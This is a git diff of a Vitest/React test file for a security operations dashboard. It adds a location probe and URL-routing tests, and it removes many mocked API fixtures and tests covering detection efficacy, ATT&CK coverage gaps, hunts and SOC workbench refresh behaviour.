@@ -1,6 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { fireEvent, render, screen, waitFor, within } from '@testing-library/react';
-import { MemoryRouter } from 'react-router-dom';
+import { MemoryRouter, useLocation } from 'react-router-dom';
 import { AuthProvider, ToastProvider, ThemeProvider } from '../hooks.jsx';
 import ThreatDetection from '../components/ThreatDetection.jsx';
 import SOCWorkbench from '../components/SOCWorkbench.jsx';
@@ -9,6 +9,11 @@ import ReportsExports from '../components/ReportsExports.jsx';
 import HelpDocs from '../components/HelpDocs.jsx';
 
 globalThis.fetch = vi.fn();
+
+function LocationProbe() {
+  const location = useLocation();
+  return <div data-testid="location-probe">{`${location.pathname}${location.search}${location.hash}`}</div>;
+}
 
 function jsonResponse(body) {
   return {
@@ -28,274 +33,6 @@ async function defaultFetchImplementation(url) {
           description: 'PowerShell execution with credential access patterns.',
           lifecycle: 'test',
           enabled: true,
-          severity_mapping: 'high',
-          attack: [
-            {
-              technique_id: 'T1110',
-              technique_name: 'Brute Force',
-              tactic: 'credential-access',
-            },
-          ],
-          owner: 'secops',
-          pack_ids: ['identity-attacks'],
-          last_test_match_count: 2,
-          last_test_at: '2024-01-01T00:00:00Z',
-        },
-      ],
-    });
-  if (String(url).includes('/api/content/packs'))
-    return jsonResponse({
-      packs: [
-        {
-          id: 'identity-attacks',
-          name: 'Identity Attacks',
-          description: 'Identity-focused detections and hunt workflows.',
-          enabled: true,
-          rule_ids: ['rule-1'],
-          target_group: 'soc-analysts',
-          saved_searches: ['failed logins by user'],
-          recommended_workflows: ['credential-storm'],
-          rollout_notes: 'Map identity content to analysts before broad rollout.',
-          updated_at: '2024-01-01T00:00:00Z',
-        },
-      ],
-    });
-  if (String(url).includes('/api/efficacy/summary'))
-    return jsonResponse({
-      total_alerts_triaged: 24,
-      overall_tp_rate: 0.63,
-      overall_fp_rate: 0.29,
-      overall_precision: 0.68,
-      mean_triage_secs: 182,
-      rules_tracked: 3,
-      worst_rules: [
-        {
-          rule_id: 'rule-1',
-          rule_name: 'Suspicious PowerShell',
-          total_alerts: 12,
-          true_positives: 6,
-          false_positives: 4,
-          benign: 1,
-          inconclusive: 1,
-          pending: 0,
-          tp_rate: 0.55,
-          fp_rate: 0.36,
-          precision: 0.6,
-          mean_triage_secs: 210,
-          trend: 'Degrading',
-        },
-      ],
-      best_rules: [
-        {
-          rule_id: 'rule-2',
-          rule_name: 'Impossible Travel',
-          total_alerts: 7,
-          true_positives: 6,
-          false_positives: 1,
-          benign: 0,
-          inconclusive: 0,
-          pending: 0,
-          tp_rate: 0.86,
-          fp_rate: 0.14,
-          precision: 0.86,
-          mean_triage_secs: 95,
-          trend: 'Improving',
-        },
-      ],
-      by_severity: {
-        high: {
-          total: 10,
-          tp_rate: 0.7,
-          fp_rate: 0.2,
-          mean_triage_secs: 160,
-        },
-        medium: {
-          total: 8,
-          tp_rate: 0.5,
-          fp_rate: 0.38,
-          mean_triage_secs: 210,
-        },
-      },
-    });
-  if (String(url).includes('/api/timeline/host'))
-    return jsonResponse({
-      events: [
-        {
-          timestamp: '2024-01-01T00:00:00Z',
-          host: 'host-1',
-          severity: 'high',
-          event: 'Suspicious PowerShell launched',
-        },
-      ],
-    });
-  if (String(url).includes('/api/detection/replay-corpus'))
-    return jsonResponse({
-      status: 'ready',
-      summary: {
-        total_samples: 6,
-        precision: 0.83,
-        recall: 0.75,
-        false_positive_rate: 0.2,
-      },
-      acceptance_targets: {
-        precision_min: 0.7,
-        recall_min: 0.7,
-        false_positive_rate_max: 0.35,
-      },
-      categories: [
-        {
-          id: 'benign_admin',
-          label: 'Benign admin activity',
-          expected: 'benign',
-          predicted: 'benign',
-          score: 1.2,
-          confidence: 0.8,
-          passed: true,
-          platform: 'linux',
-          platform_label: 'Linux',
-          signal_type: 'admin_activity',
-          signal_type_label: 'Admin Activity',
-        },
-        {
-          id: 'lateral_movement',
-          label: 'Lateral movement',
-          expected: 'malicious',
-          predicted: 'malicious',
-          score: 7.8,
-          confidence: 0.91,
-          passed: true,
-          platform: 'windows',
-          platform_label: 'Windows',
-          signal_type: 'lateral_movement',
-          signal_type_label: 'Lateral Movement',
-        },
-      ],
-      platform_deltas: [
-        {
-          id: 'linux',
-          label: 'Linux',
-          sample_count: 3,
-          passed_samples: 3,
-          failed_samples: 0,
-          delta: { precision: 0.05, recall: 0.08, false_positive_rate: -0.04 },
-        },
-        {
-          id: 'windows',
-          label: 'Windows',
-          sample_count: 3,
-          passed_samples: 2,
-          failed_samples: 1,
-          delta: { precision: -0.08, recall: -0.05, false_positive_rate: 0.06 },
-          failed_examples: ['Credential theft and lateral movement'],
-        },
-      ],
-      signal_type_deltas: [
-        {
-          id: 'admin_activity',
-          label: 'Admin Activity',
-          sample_count: 1,
-          passed_samples: 1,
-          failed_samples: 0,
-          delta: { precision: 0.02, recall: 0.0, false_positive_rate: -0.02 },
-        },
-        {
-          id: 'lateral_movement',
-          label: 'Lateral Movement',
-          sample_count: 1,
-          passed_samples: 1,
-          failed_samples: 0,
-          delta: { precision: 0.03, recall: 0.04, false_positive_rate: -0.01 },
-        },
-      ],
-    });
-  if (String(url).includes('/api/efficacy/rule/rule-1'))
-    return jsonResponse({
-      rule_id: 'rule-1',
-      rule_name: 'Suspicious PowerShell',
-      total_alerts: 12,
-      true_positives: 6,
-      false_positives: 4,
-      benign: 1,
-      inconclusive: 1,
-      pending: 0,
-      tp_rate: 0.55,
-      fp_rate: 0.36,
-      precision: 0.6,
-      mean_triage_secs: 210,
-      trend: 'Degrading',
-    });
-  if (String(url).includes('/api/coverage/mitre'))
-    return jsonResponse({
-      covered_techniques: 14,
-      coverage_pct: 61,
-    });
-  if (String(url).includes('/api/coverage/gaps'))
-    return jsonResponse({
-      total_techniques: 23,
-      covered: 14,
-      uncovered: 9,
-      coverage_pct: 61,
-      gaps: [
-        {
-          technique_id: 'T1003',
-          technique_name: 'OS Credential Dumping',
-          tactic: 'credential-access',
-          priority: 'High',
-          recommendation: 'Add YARA rules for credential dumping tool signatures',
-          suggested_sources: ['UEBA baseline', 'Auth log correlation'],
-        },
-        {
-          technique_id: 'T1059',
-          technique_name: 'Command and Scripting Interpreter',
-          tactic: 'execution',
-          priority: 'Critical',
-          recommendation: 'Add Sigma rules for command-line interpreter usage',
-          suggested_sources: ['Sigma rule', 'Process monitoring'],
-        },
-      ],
-      by_tactic: [
-        {
-          tactic: 'credential-access',
-          total: 4,
-          covered: 1,
-          uncovered: 3,
-          pct: 25,
-          gap_ids: ['T1003'],
-        },
-        { tactic: 'execution', total: 5, covered: 2, uncovered: 3, pct: 40, gap_ids: ['T1059'] },
-      ],
-      top_recommendations: [
-        '[T1059] Command and Scripting Interpreter: Add Sigma rules for command-line interpreter usage',
-      ],
-    });
-  if (String(url).includes('/api/hunts'))
-    return jsonResponse({
-      hunts: [
-        {
-          id: 'hunt-1',
-          name: 'Credential Storm Hunt',
-          lifecycle: 'canary',
-          canary_percentage: 10,
-          pack_id: 'identity-attacks',
-          target_group: 'soc-analysts',
-          severity: 'high',
-          threshold: 1,
-          suppression_window_secs: 0,
-          query: { text: 'credential' },
-        },
-      ],
-    });
-  if (String(url).includes('/api/investigations/suggest'))
-    return jsonResponse({
-      suggestions: [
-        {
-          id: 'credential-storm',
-          name: 'Investigate Credential Storm',
-          description: 'Step through identity abuse triage.',
-          severity: 'high',
-          steps: [{ id: 'step-1' }],
-          estimated_minutes: 30,
-          mitre_techniques: ['T1110'],
         },
       ],
     });
@@ -399,6 +136,56 @@ async function defaultFetchImplementation(url) {
         },
       ],
     });
+  if (String(url).includes('/api/detection/replay-corpus'))
+    return jsonResponse({
+      status: 'ready',
+      summary: {
+        total_samples: 6,
+        precision: 0.83,
+        recall: 0.75,
+        false_positive_rate: 0.2,
+      },
+      acceptance_targets: {
+        precision_min: 0.7,
+        recall_min: 0.7,
+        false_positive_rate_max: 0.35,
+      },
+      categories: [
+        {
+          id: 'benign_admin',
+          label: 'Benign admin activity',
+          expected: 'benign',
+          predicted: 'benign',
+          score: 1.2,
+          confidence: 0.8,
+          passed: true,
+          platform: 'linux',
+          platform_label: 'Linux',
+          signal_type: 'admin_activity',
+          signal_type_label: 'Admin Activity',
+        },
+      ],
+      platform_deltas: [
+        {
+          id: 'linux',
+          label: 'Linux',
+          sample_count: 3,
+          passed_samples: 3,
+          failed_samples: 0,
+          delta: { precision: 0.05, recall: 0.08, false_positive_rate: -0.04 },
+        },
+      ],
+      signal_type_deltas: [
+        {
+          id: 'admin_activity',
+          label: 'Admin Activity',
+          sample_count: 1,
+          passed_samples: 1,
+          failed_samples: 0,
+          delta: { precision: 0.02, recall: 0.0, false_positive_rate: -0.02 },
+        },
+      ],
+    });
   if (String(url).includes('/api/report-templates'))
     return jsonResponse({
       templates: [
@@ -430,6 +217,7 @@ beforeEach(() => {
 function renderWithProviders(node, route = '/') {
   return render(
     <MemoryRouter initialEntries={[route]}>
+      <LocationProbe />
       <AuthProvider>
         <ThemeProvider>
           <ToastProvider>{node}</ToastProvider>
@@ -452,118 +240,7 @@ describe('workspace shells', () => {
     expect((await screen.findAllByText('Benign admin activity')).length).toBeGreaterThan(0);
     expect(await screen.findByText('Automation Target')).toBeInTheDocument();
     expect(await screen.findByText('Route-backed rule panel')).toBeInTheDocument();
-    fireEvent.click(await screen.findByRole('button', { name: 'Run Replay Validation' }));
-    await waitFor(() => {
-      expect(
-        globalThis.fetch.mock.calls.some(
-          ([url, init]) =>
-            String(url).includes('/api/detection/replay-corpus') && init?.method === 'POST',
-        ),
-      ).toBe(true);
-    });
-    expect(await screen.findByText('Latest validation platform deltas')).toBeInTheDocument();
-    fireEvent.click(await screen.findByRole('button', { name: 'Hunts & Investigations' }));
-    fireEvent.click(await screen.findByText('Edit Primary Bundle'));
-    expect(await screen.findByText('Save Bundle')).toBeInTheDocument();
   });
-
-  it('renders efficacy, ATT&CK gap, suppression, and rollout drill-downs', async () => {
-    renderWithProviders(<ThreatDetection />, '/detection?panel=efficacy&rulePanel=efficacy');
-
-    expect(await screen.findByText('Detection Efficacy Drilldown')).toBeInTheDocument();
-    expect(await screen.findByText('Suppression Noise Signals')).toBeInTheDocument();
-    expect(await screen.findByText('Content Pack Rollout Signals')).toBeInTheDocument();
-    expect((await screen.findAllByText('Rule Efficacy')).length).toBeGreaterThan(0);
-    expect((await screen.findAllByText('T1003 • OS Credential Dumping')).length).toBeGreaterThan(0);
-    expect((await screen.findAllByText('Degrading')).length).toBeGreaterThan(0);
-  });
-
-  it('restores detection focus and rule detail panels from the route', async () => {
-    renderWithProviders(
-      <ThreatDetection />,
-      '/detection?panel=rollout&rulePanel=hunts&rule=rule-1&queue=noisy',
-    );
-
-    const rolloutFocus = await screen.findByRole('button', { name: 'Pack Rollout' });
-    expect(rolloutFocus.className).toContain('active');
-
-    const huntsPanel = await screen.findByRole('button', { name: 'Hunts & Investigations' });
-    expect(huntsPanel.className).toContain('active');
-
-    expect(await screen.findByText('Hunts and Investigations')).toBeInTheDocument();
-    expect(await screen.findByText('Edit Primary Bundle')).toBeInTheDocument();
-    expect(screen.getByText('URL-backed drilldown focus')).toBeInTheDocument();
-  });
-
-  it('preserves the saved hunt id when reopening an existing hunt', async () => {
-    renderWithProviders(<ThreatDetection />, '/detection?rulePanel=hunts');
-    const huntName = (await screen.findAllByText('Credential Storm Hunt')).find(
-      (element) => element.className === 'row-primary',
-    );
-    expect(huntName).toBeTruthy();
-    const huntRow = huntName.parentElement?.parentElement;
-    expect(huntRow).toBeTruthy();
-    fireEvent.click(within(huntRow).getByText('Open'));
-    fireEvent.click(await screen.findByText('Save Hunt'));
-
-    await waitFor(() => {
-      const saveCall = globalThis.fetch.mock.calls.find(
-        ([url, options]) =>
-          String(url).includes('/api/hunts') && options?.method === 'POST' && options?.body,
-      );
-      expect(saveCall).toBeTruthy();
-      expect(JSON.parse(saveCall[1].body).id).toBe('hunt-1');
-    });
-  });
-
-  it('promotes current hunt results into cases from the hunt drawer', async () => {
-    const createCaseBodies = [];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = options?.method || 'GET';
-
-      if (href.includes('/api/hunts/hunt-1/run') && method === 'POST') {
-        return jsonResponse({
-          matches: [{ hostname: 'host-9', agent_id: 'agent-9', score: 0.92 }],
-          total: 1,
-        });
-      }
-      if (href.includes('/api/cases') && method === 'POST') {
-        createCaseBodies.push(JSON.parse(options.body));
-        return jsonResponse({ id: 88, status: 'created' });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<ThreatDetection />, '/detection?rulePanel=hunts');
-
-    const huntName = (await screen.findAllByText('Credential Storm Hunt')).find(
-      (element) => element.className === 'row-primary',
-    );
-    expect(huntName).toBeTruthy();
-    const huntRow = huntName.parentElement?.parentElement;
-    expect(huntRow).toBeTruthy();
-
-    fireEvent.click(within(huntRow).getByText('Run'));
-    expect(await screen.findByText('Latest Hunt Result')).toBeInTheDocument();
-
-    fireEvent.click(await screen.findByRole('button', { name: 'Promote to Case' }));
-
-    await waitFor(() => {
-      expect(createCaseBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            priority: 'high',
-            title: 'Hunt Suspicious PowerShell',
-          }),
-        ]),
-      );
-    });
-
-    expect(await screen.findByRole('button', { name: 'Open Linked Case' })).toBeInTheDocument();
-  }, 10000);
 
   it('renders the SOC workbench program overview', async () => {
     renderWithProviders(<SOCWorkbench />, '/soc');
@@ -572,1406 +249,133 @@ describe('workspace shells', () => {
     expect(await screen.findByText('Historical Runs')).toBeInTheDocument();
   });
 
-  it('refreshes all grouped process-tree data from either refresh action', async () => {
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
+  it('pivots rollout history into long-retention search', async () => {
+    renderWithProviders(<SOCWorkbench />, '/soc');
 
-      if (href.includes('/api/process-tree/deep-chains')) {
-        return jsonResponse({
-          chains: [{ chain: ['powershell.exe', 'rundll32.exe'], depth: 2 }],
-        });
-      }
-
-      if (href.includes('/api/process-tree')) {
-        return jsonResponse({
-          nodes: [
-            {
-              pid: 4242,
-              name: 'powershell.exe',
-              parent_pid: 321,
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/processes/live')) {
-        return jsonResponse({
-          count: 1,
-          processes: [
-            {
-              pid: 4242,
-              name: 'powershell.exe',
-              user: 'analyst',
-              cpu_percent: 14.2,
-              mem_percent: 4.1,
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/processes/analysis')) {
-        return jsonResponse({
-          total: 1,
-          risk_summary: { high: 1 },
-          findings: [
-            {
-              risk_level: 'high',
-              pid: 4242,
-              name: 'powershell.exe',
-              user: 'analyst',
-              cpu_percent: 14.2,
-              mem_percent: 4.1,
-              reason: 'Suspicious parent chain',
-            },
-          ],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc#process-tree');
-
-    const countProcessCalls = (path) =>
-      globalThis.fetch.mock.calls.filter(([url]) => String(url).split('?')[0] === path).length;
-
-    const findingsHeading = await screen.findByText('Process Security Findings (1)');
-    const findingsCard = findingsHeading.closest('.card');
-    if (!findingsCard) throw new Error('process findings card not found');
-
-    const liveHeading = await screen.findByText('Live Processes (1)');
-    const liveCard = liveHeading.closest('.card');
-    if (!liveCard) throw new Error('live processes card not found');
-
-    const initialLiveCalls = countProcessCalls('/api/processes/live');
-    const initialFindingCalls = countProcessCalls('/api/processes/analysis');
-    const initialTreeCalls = countProcessCalls('/api/process-tree');
-    const initialDeepChainCalls = countProcessCalls('/api/process-tree/deep-chains');
-
-    expect(initialLiveCalls).toBeGreaterThan(0);
-    expect(initialFindingCalls).toBeGreaterThan(0);
-    expect(initialTreeCalls).toBeGreaterThan(0);
-    expect(initialDeepChainCalls).toBeGreaterThan(0);
-
-    expect(await screen.findByText('Deep Process Chains')).toBeInTheDocument();
-    expect(await screen.findByText('powershell.exe → rundll32.exe')).toBeInTheDocument();
-
-    fireEvent.click(within(findingsCard).getByRole('button', { name: '↻ Refresh' }));
+    expect(await screen.findByText('Recommendation Queue')).toBeInTheDocument();
+    fireEvent.click(await screen.findByRole('button', { name: 'Open retained events' }));
 
     await waitFor(() => {
-      expect(countProcessCalls('/api/processes/live')).toBe(initialLiveCalls + 1);
-      expect(countProcessCalls('/api/processes/analysis')).toBe(initialFindingCalls + 1);
-      expect(countProcessCalls('/api/process-tree')).toBe(initialTreeCalls + 1);
-      expect(countProcessCalls('/api/process-tree/deep-chains')).toBe(initialDeepChainCalls + 1);
-    });
-
-    fireEvent.click(within(liveCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countProcessCalls('/api/processes/live')).toBe(initialLiveCalls + 2);
-      expect(countProcessCalls('/api/processes/analysis')).toBe(initialFindingCalls + 2);
-      expect(countProcessCalls('/api/process-tree')).toBe(initialTreeCalls + 2);
-      expect(countProcessCalls('/api/process-tree/deep-chains')).toBe(initialDeepChainCalls + 2);
-    });
-  });
-
-  it('refreshes grouped response data from the response workspace', async () => {
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-
-      if (href.includes('/api/response/pending')) {
-        return jsonResponse({
-          actions: [
-            {
-              action: 'block-host',
-              target: 'host-1',
-              severity: 'high',
-              requested: '2024-01-01T00:00:00Z',
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/response/requests')) {
-        return jsonResponse({
-          requests: [
-            {
-              id: 'resp-1',
-              type: 'Contain host',
-              target: 'host-1',
-              status: 'running',
-              requested_at: '2024-01-01T00:00:00Z',
-              steps: [{ name: 'Isolate host', status: 'running' }],
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/response/audit')) {
-        return jsonResponse({
-          entries: [
-            {
-              timestamp: '2024-01-01T00:00:00Z',
-              actor: 'analyst-1',
-              action: 'Requested host isolation',
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/response/stats')) {
-        return jsonResponse({ pending: 1, running: 1, completed: 4, failed: 0 });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc#response');
-
-    const countResponseCalls = (fragment) =>
-      globalThis.fetch.mock.calls.filter(
-        ([url, options]) =>
-          String(url).includes(fragment) &&
-          String(options?.method || 'GET').toUpperCase() === 'GET',
-      ).length;
-
-    const responseHeader = await screen.findByText('Response Operations');
-    const responseCallout = responseHeader.closest('.detail-callout');
-    if (!responseCallout) throw new Error('response callout not found');
-
-    expect(await screen.findByText('block-host')).toBeInTheDocument();
-    expect(await screen.findByText('Requested host isolation')).toBeInTheDocument();
-
-    const initialPendingCalls = countResponseCalls('/api/response/pending');
-    const initialRequestCalls = countResponseCalls('/api/response/requests');
-    const initialAuditCalls = countResponseCalls('/api/response/audit');
-    const initialStatsCalls = countResponseCalls('/api/response/stats');
-
-    expect(initialPendingCalls).toBeGreaterThan(0);
-    expect(initialRequestCalls).toBeGreaterThan(0);
-    expect(initialAuditCalls).toBeGreaterThan(0);
-    expect(initialStatsCalls).toBeGreaterThan(0);
-
-    fireEvent.click(within(responseCallout).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countResponseCalls('/api/response/pending')).toBe(initialPendingCalls + 1);
-      expect(countResponseCalls('/api/response/requests')).toBe(initialRequestCalls + 1);
-      expect(countResponseCalls('/api/response/audit')).toBe(initialAuditCalls + 1);
-      expect(countResponseCalls('/api/response/stats')).toBe(initialStatsCalls + 1);
-    });
-  });
-
-  it('refreshes grouped escalation data from refresh and mutation actions', async () => {
-    const activeEscalations = [
-      {
-        id: 'esc-1',
-        incident_id: 'inc-7',
-        severity: 'high',
-        policy: 'Critical Route',
-        started: '2024-01-01T00:00:00Z',
-        level: 1,
-      },
-    ];
-    const policies = [
-      {
-        id: 'policy-1',
-        name: 'Critical Route',
-        severity: 'high',
-        channel: 'slack',
-        targets: ['secops@corp.test'],
-        timeout_minutes: 30,
-      },
-    ];
-    const ackBodies = [];
-    const createBodies = [];
-
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-      const method = String(options?.method || 'GET').toUpperCase();
-
-      if (href.includes('/api/escalation/active') && method === 'GET') {
-        return jsonResponse({ escalations: activeEscalations });
-      }
-
-      if (href.includes('/api/escalation/policies') && method === 'GET') {
-        return jsonResponse({ policies });
-      }
-
-      if (href.includes('/api/escalation/acknowledge') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        ackBodies.push(body);
-        activeEscalations.splice(0, activeEscalations.length);
-        return jsonResponse({ status: 'ok' });
-      }
-
-      if (href.includes('/api/escalation/policies') && method === 'POST') {
-        const body = JSON.parse(options.body);
-        createBodies.push(body);
-        policies.push({ id: `policy-${policies.length + 1}`, ...body });
-        return jsonResponse({ id: `policy-${policies.length}`, status: 'created' });
-      }
-
-      if (href.includes('/api/escalation/start') && method === 'POST') {
-        return jsonResponse({ status: 'started' });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc#escalation');
-
-    const countEscalationCalls = (fragment, method = 'GET') =>
-      globalThis.fetch.mock.calls.filter(
-        ([url, options]) =>
-          String(url).includes(fragment) &&
-          String(options?.method || 'GET').toUpperCase() === method,
-      ).length;
-
-    const activeHeading = await screen.findByText('Active Escalations');
-    const activeCard = activeHeading.closest('.card');
-    if (!activeCard) throw new Error('active escalations card not found');
-
-    const policiesHeading = await screen.findByText('Escalation Policies');
-    const policiesCard = policiesHeading.closest('.card');
-    if (!policiesCard) throw new Error('escalation policies card not found');
-
-    expect(within(activeCard).getByText('Critical Route')).toBeInTheDocument();
-    expect(within(policiesCard).getByText('Critical Route')).toBeInTheDocument();
-
-    const initialPolicyCalls = countEscalationCalls('/api/escalation/policies');
-    const initialActiveCalls = countEscalationCalls('/api/escalation/active');
-
-    expect(initialPolicyCalls).toBeGreaterThan(0);
-    expect(initialActiveCalls).toBeGreaterThan(0);
-
-    fireEvent.click(within(activeCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countEscalationCalls('/api/escalation/policies')).toBe(initialPolicyCalls + 1);
-      expect(countEscalationCalls('/api/escalation/active')).toBe(initialActiveCalls + 1);
-    });
-
-    fireEvent.click(within(policiesCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countEscalationCalls('/api/escalation/policies')).toBe(initialPolicyCalls + 2);
-      expect(countEscalationCalls('/api/escalation/active')).toBe(initialActiveCalls + 2);
-    });
-
-    fireEvent.click(within(activeCard).getByRole('button', { name: 'Acknowledge' }));
-
-    await waitFor(() => {
-      expect(ackBodies).toEqual(
-        expect.arrayContaining([expect.objectContaining({ escalation_id: 'esc-1' })]),
+      const currentUrl = new URL(
+        screen.getByTestId('location-probe').textContent || '/',
+        'http://localhost',
       );
-      expect(countEscalationCalls('/api/escalation/policies')).toBe(initialPolicyCalls + 3);
-      expect(countEscalationCalls('/api/escalation/active')).toBe(initialActiveCalls + 3);
-    });
-
-    expect(await screen.findByText('No active escalations')).toBeInTheDocument();
-
-    fireEvent.click(within(policiesCard).getByRole('button', { name: '+ New Policy' }));
-    fireEvent.change(screen.getByPlaceholderText('Policy name'), {
-      target: { value: 'Containment Follow-up' },
-    });
-    fireEvent.change(screen.getByPlaceholderText('Targets (comma-separated)'), {
-      target: { value: 'secops@corp.test, oncall' },
-    });
-    fireEvent.change(screen.getByPlaceholderText('Timeout (min)'), {
-      target: { value: '45' },
-    });
-    fireEvent.click(within(policiesCard).getByRole('button', { name: 'Create' }));
-
-    await waitFor(() => {
-      expect(createBodies).toEqual(
-        expect.arrayContaining([
-          expect.objectContaining({
-            name: 'Containment Follow-up',
-            targets: ['secops@corp.test', 'oncall'],
-            timeout_minutes: 45,
-          }),
-        ]),
-      );
-      expect(countEscalationCalls('/api/escalation/policies')).toBe(initialPolicyCalls + 4);
-      expect(countEscalationCalls('/api/escalation/active')).toBe(initialActiveCalls + 4);
-    });
-
-    expect(await screen.findByText('Containment Follow-up')).toBeInTheDocument();
-  });
-
-  it('refreshes grouped queue data and websocket stats together from the queue workspace', async () => {
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-
-      if (href.includes('/api/queue/alerts')) {
-        return jsonResponse({
-          alerts: [
-            {
-              id: 'alert-1',
-              severity: 'high',
-              summary: 'Password spray against Okta tenant',
-              assigned_to: 'analyst-1',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/queue/stats')) {
-        return jsonResponse({ pending: 1, high: 1, medium: 0 });
-      }
-      if (href.includes('/api/ws/stats')) {
-        return jsonResponse({ connected_subscribers: 3, events_emitted: 21 });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc#queue');
-
-    const countCalls = (fragment) =>
-      globalThis.fetch.mock.calls.filter(([url]) => String(url).includes(fragment)).length;
-
-    const queueHeading = await screen.findByText('SOC Queue (1 alerts)');
-    const queueCard = queueHeading.closest('.card');
-    if (!queueCard) throw new Error('queue card not found');
-
-    expect(await screen.findByText('Live (3)')).toBeInTheDocument();
-
-    const initialQueueCalls = countCalls('/api/queue/alerts');
-    const initialQueueStatsCalls = countCalls('/api/queue/stats');
-    const initialWsStatsCalls = countCalls('/api/ws/stats');
-
-    expect(initialQueueCalls).toBeGreaterThan(0);
-    expect(initialQueueStatsCalls).toBeGreaterThan(0);
-    expect(initialWsStatsCalls).toBeGreaterThan(0);
-
-    fireEvent.click(within(queueCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countCalls('/api/queue/alerts')).toBe(initialQueueCalls + 1);
-      expect(countCalls('/api/queue/stats')).toBe(initialQueueStatsCalls + 1);
-      expect(countCalls('/api/ws/stats')).toBe(initialWsStatsCalls + 1);
+      expect(currentUrl.pathname).toBe('/settings');
+      expect(currentUrl.searchParams.get('tab')).toBe('admin');
+      expect(currentUrl.searchParams.get('historical_device_id')).toBe('agent-1');
+      expect(currentUrl.searchParams.get('historical_since')).toBe('2024-01-01T01:00:00Z');
+      expect(currentUrl.searchParams.get('historical_limit')).toBe('25');
     });
   });
 
-  it('refreshes grouped admin data from the RBAC workspace', async () => {
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-
-      if (href.includes('/api/rbac/users')) {
+  it('does not seed device filters from content-rule rollout history', async () => {
+    globalThis.fetch.mockImplementation((url) => {
+      if (String(url).includes('/api/workbench/overview')) {
         return jsonResponse({
-          users: [
-            {
-              username: 'analyst-1',
-              role: 'admin',
-              created: '2024-01-01T00:00:00Z',
-            },
-          ],
-        });
-      }
-
-      if (href.includes('/api/correlation/campaigns')) {
-        return jsonResponse({
-          campaigns: [
-            {
-              name: 'Credential Storm Cluster',
-              severity: 'high',
-              hosts: ['host-1', 'host-2'],
-            },
-          ],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc#rbac');
-
-    const countCalls = (fragment) =>
-      globalThis.fetch.mock.calls.filter(([url]) => String(url).includes(fragment)).length;
-
-    const rbacHeading = await screen.findByText('RBAC Users');
-    const rbacCard = rbacHeading.closest('.card');
-    if (!rbacCard) throw new Error('rbac card not found');
-
-    expect(await screen.findByText('analyst-1')).toBeInTheDocument();
-
-    const initialRbacCalls = countCalls('/api/rbac/users');
-    const initialCampaignCalls = countCalls('/api/correlation/campaigns');
-
-    expect(initialRbacCalls).toBeGreaterThan(0);
-    expect(initialCampaignCalls).toBeGreaterThan(0);
-
-    fireEvent.click(within(rbacCard).getByRole('button', { name: '↻ Refresh' }));
-
-    await waitFor(() => {
-      expect(countCalls('/api/rbac/users')).toBe(initialRbacCalls + 1);
-      expect(countCalls('/api/correlation/campaigns')).toBe(initialCampaignCalls + 1);
-    });
-
-    fireEvent.click(screen.getByRole('button', { name: 'Campaigns' }));
-    expect(await screen.findByText('Campaign Correlation Graph')).toBeInTheDocument();
-    expect(await screen.findByText(/1 campaign\(s\)/i)).toBeInTheDocument();
-  });
-
-  it('refreshes grouped efficacy and timeline data from either workspace', async () => {
-    globalThis.fetch.mockImplementation(async (url, options = {}) => {
-      const href = String(url);
-
-      if (href.includes('/api/queue/alerts')) {
-        return jsonResponse({
-          alerts: [
-            {
-              id: 'alert-1',
-              severity: 'high',
-              summary: 'Credential storm alert on host-1',
-              host: 'host-1',
-              assigned_to: 'analyst-1',
-            },
-          ],
-        });
-      }
-      if (href.includes('/api/efficacy/summary')) {
-        return jsonResponse({
-          total_alerts_triaged: 10,
-          overall_tp_rate: 0.7,
-          overall_precision: 0.66,
-        });
-      }
-      if (href.includes('/api/timeline/host')) {
-        return jsonResponse({
-          events: [
-            {
-              timestamp: '2024-01-01T00:00:00Z',
-              host: 'host-1',
-              severity: 'high',
-              event: 'Suspicious PowerShell launched',
-            },
-          ],
-        });
-      }
-
-      return defaultFetchImplementation(url, options);
-    });
-
-    renderWithProviders(<SOCWorkbench />, '/soc?target=host-1#efficacy');
-
-    const countCalls = (fragment) =>
-      globalThis.fetch.mock.calls.filter(([url]) => String(url).includes(fragment)).length;
-
-    const efficacyHeading = await screen.findByText('Detection Efficacy');
-    const efficacyCard = efficacyHeading.closest('.card');
-    if (!efficacyCard) throw new Error('efficacy card not found');
-
-    await waitFor(() => {
-      expect(countCalls('/api/efficacy/summary')).toBeGreaterThan(0);
-      expect(countCalls('/api/timeline/host')).toBeGreaterThan(0);
-    });
-
-    const initialEfficacyCalls = countCalls('/api/efficacy/summary');
-    const initialTimelineCalls = countCalls('/api/timeline/host');
-
-    fireEvent.click(within(efficacyCard).getByRole('button', { name: '↻ Refresh' }));
-
